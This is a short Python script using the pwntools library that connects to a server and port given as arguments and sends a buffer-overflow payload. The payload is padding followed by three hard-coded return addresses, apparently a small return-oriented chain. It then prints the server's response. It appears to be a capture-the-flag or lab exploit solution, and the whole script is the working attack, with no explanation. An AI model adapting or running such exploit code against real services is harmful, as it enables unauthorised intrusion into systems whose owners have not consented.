#!/usr/bin/env python3

from pwn import *
import sys

server = sys.argv[1]
port = int(sys.argv[2])
r = remote(server, port)
r.recvuntil("?")
a  = p64(0x00000000) + p64(0x00000000) + p64(0x00000000) + p64(0x401a11) + p64(0x4a3e10) + p64(0x4017f5)
r.sendline(a)
print(r.recvall(1).decode("utf-8", "ignore").strip())